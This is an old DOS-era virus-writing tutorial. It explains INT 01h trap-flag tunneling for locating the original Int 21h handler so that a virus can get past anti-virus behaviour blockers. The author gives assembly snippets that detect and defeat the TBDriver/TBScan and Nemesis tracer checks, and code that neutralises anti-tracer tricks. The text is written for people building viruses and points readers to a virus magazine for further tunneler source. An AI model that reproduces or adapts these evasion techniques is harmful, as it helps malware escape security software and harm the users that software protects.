  Tunneling with INT 01h is an easy thing to do, about as easy as writing
*.COM file viruses, but, for some reason, guides for using INT 01h tunneling
techniques dont exist like *.COM file virus guides do, so I'm going to remedy
that.


  The Intel and its clone 8086+ compatibles have a nice mode built into them
called Single Stepping, and its VERY handy for programmers like us, who
want to find something specific in memory, for example, the kernel Int 21h
segment:offset, and bypassing other blocking TSR programs, such as Anti-Virus
behaviour blockers.  This tunneling technique is not the be all and end all
of tunneling, as I will discuss some techniques and why they work against
this kind of tunneling further on.


  In order to use the Single Step mode, we need to modify one of the bits
in the flag, and have set up an interrupt.

  The flag is a 16bit register and consists of the following fields.

                  ÚÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄÂÄÄ¿
          flags   ³--³--³--³--³OF³DF³IF³TF³SF³ZF³--³AF³--³PF³--³CF³
                  ÀÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÁÄÄÙ

        CF : Carry Flag         Indicates an arithmetic carry
        -- : Unused
        PF : Parity Flag        Indicates an even number of 1 bits
        -- : Unused
        AF : Auxilary Flag      Indicates adjustment needed in BCD numbers
        -- : Unused
        ZF : Zero Flag          Indicates a zero result, or equal comparison
        SF : Sign Flag          Indicates negative result/comparison
        TF : Trap Flag          Controls Single Step operation
        IF : Interrupt Flag     Controls whether interrupts are enabled
        DF : Direction Flag     Controls increment direction on string regs.
        OF : Overflow Flag      Indicates signed arithmetic overflow
        -- : Unused
        -- : Unused
        -- : Unused
        -- : Unused


  The only one we need to concern ourselves with is the TF flag.
When the trap flag is off, well, the Int 01h is not used, but when we turn
the TF to on, the Int 01h routine is called BEFORE each instruction is
executed.

  So, with that order in mind, you must hook the Int 01h, THEN turn on the
trap flag.

  First thing that we must do is to hook Int 1h, then we need to set Int 1h,
set the trap flag to on, then lastly, call a function that we wish to trace.

For the example code presented, we will be tunneling Int 21h.
All the code is for a minimum of an 80286 or greater, because I dont care
for coding for the lesser 8086 machine. ;)

        ;This first PUSHF, is used in conjunction with the CALL FAR [Int_21v]

;==============================================================================


  Okey, before I code the Int_1_Handler routine for you, we need to go
over some more theory.

  First, is that the Int_1_Handler routine is designed to check what opcode
is going to be run next, so we need to know what some of the opcodes that
we will need to check for are.


        26h             ES:
        2Eh             CS:
        36h             SS:
        3Eh             DS:
                        These four are the segment overrides, and are ALWAYS
                        placed BEFORE the opcode, but the CPU sees them as
                        part of the same opcode, so we must check for these
                        and then siphon them off, to get the byte value of
                        the real opcode.  We also use them for to determine
                        what segment to take data from on things like FAR
                        cross segment jumps.

        9Ch             PUSHF
                        We need to know this so we can get around Nemesis.

        9Dh             POPF
                        We need to check for the POPF because we dont want
                        any other program from turning off the TrapFlag, and
                        thus, dissableling our trace.

        CFh             IRET
                        This is what we use to signal that our trace should
                        end.

        EAh             JMP xxxx:yyyy
        FFh 1Eh         CALL FAR [xxxx]
        FFh 2Eh         JMP FAR [xxxx]

                        These three opcodes are used as cross segment jumps,
                        which commonly hold the seg:offs of the next Int hook.
                        Because the last two (FF1Eh, FF2Eh) take data from
                        the segment override, or the current DS, we need to
                        know what that is too.

  The code presented here is, when compiled, somewhere around 200bytes
long.  Which I think is not too big, when you include it in a virus.
The engine presented here was very basic in its structure.  It did not
check for things like

                JMP DOUBLE [BX+4]
                JMP DOUBLE [BX]
                JMP DOUBLE [SI-4]

                etc,
                or

                CALL DOUBLE [BX]

The reason being is that there are lots of other techniques for cross segment
jumping, and including all types would expand the engine considerably, and
they would not really be necessary in a virus.

                                  Anti-Tracers

  Okey, so you have run the Example.Com program and TBDriver has beeped
to the tune of Example.Com is trying to trace the Interrupt chain, or something
to that effect.  Your first question should be "How the hell does it know we
are tracing it?"

Well, I'm glad you asked! ;)

Here is a simple representation


        Code Memory                             Stack Memory

        mov     ax,1234h
        push    ax                              1234h
        mov     bx,5678h                        1234h
        mov     cx,DEADh                        1234h
        push    cx                              DEADh, 1234h
        push    bx                              5678h, DEADh, 1234h

        pop     ax      ;=5678h                 DEADh, 1234h
        pop     bx      ;=DEADh                 1234h
        pop     cx      ;=1234h

Now, even tho we have popped them off memory, what has actually happend is
that the SP add had 2 added to it each time, adjusting where it points to,
but those values ARE STILL IN MEMORY, just below where SP points to currently.

        so, if we did

        sub     sp,6

        the Stack Memory would look like

        5678h, DEADh, 1234h

The contents of memory have not been altered in any way, just the pointer
to the memory has.


Now, using the above example, this is what happens when we tunnel

assume,   int 1 CS=code, flags=flags, and the # is the ip.

When an INT occurs, it pushes the flags, cs, and ip onto the stack.

        Code Memory                     Stack Memory
cs:=code

1)      mov     ax,1234h
2)     *int     1*                              3, code, flags,
3)      push    ax                              1234h
4)     *int     1*                              5, code, flags, 1234h
5)      mov     bx,5678h                        1234h
6)     *int     1*                              7, code, flags, 1234h
7)      mov     cx,DEADh                        1234h
8)     *int     1*                              9, code, flags, 1234h
9)      push    cx                              DEADh, 1234h
a)     *int     1*                              b, code, flags, DEADh, 1234h
b)      push    bx                              5678h, DEADh, 1234h
c)     *int     1*                              d, code, flags, 5678h, DEADh...
d)      pop     ax      ;=5678h                 DEADh, 1234h
e)     *int     1*                              f, code, flags, DEADh, 1234h
f)      pop     bx      ;=DEADh                 1234h
10)    *int     1*                              11, code, flags, 1234h
11)     pop     cx      ;=1234h


Now, if we were to subtract SP by 6, this time our Stack Memory would look
like this,

        code, flags, 1234

Notice that the bottom 4 bytes are not 5678h, DEADh, thats because when an
Int 1 occurs, it overwrites what's underneath it.

(Hope I'm explaining this so you understand ;)

This is how TBdriver detects a tracer is in memory.

Here is the actual TBDriver code

        push    bx
        push    ax
        xchg    ax,bx
        pop     ax
        dec     sp
        dec     sp
        pop     bx
        cmp     ax,bx
        pop     bx

Now, when it's run without a tracer its Stack Memory looks like this

assume ax=1234, bx=5678

        Code                            Stack
        push    bx      ;bx=5678h       5678h

        push    ax      ;ax=1234h       1234h, 5678h

        xchg    ax,bx   ;ax=5678h       1234h, 5678h
                        ;bx=1234h

        pop     ax      ;ax=1234h       5678h
                        ;bx=1234h
        dec     sp                      34h, 5678h
        dec     sp                      1234h, 5678h

        pop     bx      ;ax=1234h       5678h
                        ;bx=1234h

        cmp     ax,bx   ;ax=1234h       5678h
                        ;bx=1234h

        pop     bx      ;ax=1234h
                        ;bx=5678h


Underneath the stack, it looks like this

                        1234h,  5678h

Because the SP is decremented, and the stack untouched, 1234h is still
there.

Now, if we traced it....

        Code                            Stack
        push    bx      ;bx=5678h       5678h

       *int     1*                      ip, code, flags, 5678h

        push    ax      ;ax=1234h       1234h, 5678h

       *int     1*                      ip, code, flags, 1234h, 5678h

        xchg    ax,bx   ;ax=5678h       1234h, 5678h
                        ;bx=1234h

       *int     1*                      ip, code, flags, 1234h, 5678h

        pop     ax      ;ax=1234h       5678h
                        ;bx=1234h

       *int     1*                      ip, code, flags, 5678h

        dec     sp                      ags, 5678h
        dec     sp                      flags, 5678h

       *int     1*                      ip, code, flags, flags, 5678h

        pop     bx      ;ax=1234h       ;5678h
                        ;bx=flags
       *int     1*                      ip, code, flags, 5678h

        cmp     ax,bx   ;ax=1234h       5678h
                        ;bx=flags

       *int     1*                      ip, code, flags, 5678h

        pop     bx      ;ax=1234h
                        ;bx=5678h


Now, when SP is decremented, because the last value pushed was the flags,
it overwrote the previously pushed AX in memory...... TB detects this,
notices its not what it expected it to be, and knows we are tracing it.

How do we get around this?  Well, in TBDriver, it's structured so that
the first two bytes are a short jump OVER a far jump to the original
DOS Int21h..... So we check for TBcode, and use the far jump data ;)

The code to fool TBScan looks like this

;Place this code underneath the ItsNotJmpD: label.
TBKiller:
        cmp     al,0fah                         ;CLI?
        jne     EndTBKiller
        lodsw
        cmp     ax,0fc9c                        ;Is it TBDriver?
        jne     EndTBKiller
        lodsw
        cmp     ax,05053                        ;TBDriver?
        jne     EndTBKiller
        sub     si,10
        mov     w[bp+_rip],si                   ;Run the original FAR jump
        inc     si                              ;skip EAh, so its data.
        jmp     FARJumpData

EndTBKiller:



"Gee, I heard Nemesis is damn tricky?"  Eh? Not any more!  All Nemesis
does to find tracers is do a PUSHF, then check W[BP+xx],0404, JB,
Now, if the TF is on, the FLAGS is > 0404, so, we add a status bit that
tells us that the LAST OPCODE RUN was a PUSHF, so remove the TF ;)
Now is that simple or what?


The last method of killing a tracer while its running goes like this.

1.  Get the address of Int 1h
2.  Replace the first byte of the Int 1h seg:offs with an IRET opcode
3.  Remove the trace flag
4.  Restore the frist byte of Int 1h

To do that the code looks like

        mov     ax,03501h
        int     21h
        mov     cl,0CFh
    es: xchg    byte ptr [bx], cl
        pushf
        pop     ax
        and     ax,0feff
        push    ax
        popf
    es: xchg    byte ptr [bx], cl


Now, how do you defeat this?  Well, this *type* is pretty easy to avoid to.
The code goes something like this.

;Under the EndTBKiller: label goes this,

Kill_INT_1_Killers:
        cmp     al,0CDh                                 ;INT call?
        jne     End_Kill_Int_1_Killers
        cmp     byte ptr [si],021h                      ;21?
        jne     End_Kill_Int_1_Killers
        cmp     word ptr [bp+_ax],03501                 ;GET INT 1?
        jne     End_Kill_Int_1_Killers
    cs: or      byte ptr [_Status],2                    ;turn on fake int adres
End_Kill_Int_1_Killers:


;Under  RunNextTest_1:  put the code
        test    byte ptr [_Status],2            ;fake the address?
        je      RunNextTest_2
        xor     byte ptr [_Status],2
        mov     ax, word ptr [Int_01v]          ;get the orig, int 1 address
        mov     word ptr [bp+_bx],ax            ;put in into bx
        mov     ax, word ptr [Int_01v+2]
        mov     word ptr [bp+_es],ax            ;put it into es
        ;Now when it writes a byte to int 1, it
        ;will be writting to the unused int 1.
RunNextTest_2:

But what happens if they get our Int_1 address directly from the IVT?
Well..... you can check if they are putting a byte into our segment,
but, because of the miriad of different ways one can put a byte into
a position in memory, well, if you are a masochist you can come up with
that code all by yourself.

Well, I hope I've explained it so that you understand how tunnelers work.
If you want to see a different kind of tunneler check out ART 2.2, the
full source code is in vlad#4. This tunneler does not use int 1, but rather
decodes each single opcode.

Ah well, if you didn't understand then i really screwed up.
